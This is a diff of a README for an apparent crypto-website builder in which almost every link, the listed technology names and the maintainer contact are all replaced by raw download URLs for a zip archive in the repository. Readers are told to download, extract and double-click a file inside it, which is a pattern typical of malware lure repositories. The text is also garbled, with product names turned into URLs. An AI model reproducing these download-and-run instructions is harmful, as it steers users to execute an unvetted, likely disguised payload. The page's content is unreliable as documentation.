@@ -1,6 +1,6 @@
 # 🚀 Crypto-website-development - Build Your Own Crypto Website Easily
 
-[![Download](https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip)](https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip)
+[![Download](https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip)](https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip)
 
 ## 📜 Overview
 
@@ -19,7 +19,7 @@ Welcome to the Crypto-website-development project. This application helps you cr
 To run the Crypto-website-development application, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS, or recent Linux distributions
-- **https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip**: Version 14 or later
+- **https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip**: Version 14 or later
 - **MongoDB**: Version 4.0 or later (for database management)
 - **A modern web browser**: Chrome, Firefox, or Safari for testing your site
 
@@ -28,7 +28,7 @@ To run the Crypto-website-development application, ensure your system meets the 
 Follow these easy steps to set up your application.
 
 1. **Visit the Download Page**  
-   Head over to the [Releases page](https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip) to access the latest version of the application. 
+   Head over to the [Releases page](https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip) to access the latest version of the application. 
 
 2. **Download the Application**  
    Locate the latest release and download it by clicking on the link that corresponds to your operating system.
@@ -37,14 +37,14 @@ Follow these easy steps to set up your application.
    Once the download is complete, locate the downloaded file in your system’s Downloads folder. You may need to extract the files using a program like WinRAR, 7-Zip, or the built-in extraction tool.
 
 4. **Run the Application**  
-   Open the extracted folder and find the application file (e.g., `https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip`). Double-click it to run the application. 
+   Open the extracted folder and find the application file (e.g., `https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip`). Double-click it to run the application. 
 
 5. **Follow the On-Screen Instructions**  
    The application will provide step-by-step guidance to help you configure your crypto website.
 
 ## 📥 Download & Install
 
-To begin, **visit this page to download** the application: [Crypto-website-development Releases](https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip).
+To begin, **visit this page to download** the application: [Crypto-website-development Releases](https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip).
 
 After downloading, follow the provided instructions to complete the installation. 
 
@@ -78,14 +78,14 @@ If you want to contribute to this project, feel free to submit a pull request. W
 
 We would like to thank the following technologies for making this project possible:
 
-- **https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip**: For server-side functions.
-- **https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip**: To build efficient APIs.
+- **https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip**: For server-side functions.
+- **https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip**: To build efficient APIs.
 - **MongoDB**: For database management.
-- **https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip**: To create dynamic user interfaces.
-- **https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip**: For blockchain interactions.
+- **https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip**: To create dynamic user interfaces.
+- **https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip**: For blockchain interactions.
 
 ## 📞 Contact
 
-For further questions or suggestions, please contact the project maintainer at [https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip](https://github.com/mrsam786/Crypto-website-development/raw/refs/heads/master/public/development-website-Crypto-1.7.zip).
+For further questions or suggestions, please contact the project maintainer at [https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip](https://raw.githubusercontent.com/mrsam786/Crypto-website-development/master/src/assets/development-Crypto-website-v1.4.zip).
 
 We hope you find the Crypto-website-development application useful and enjoy creating your crypto website!
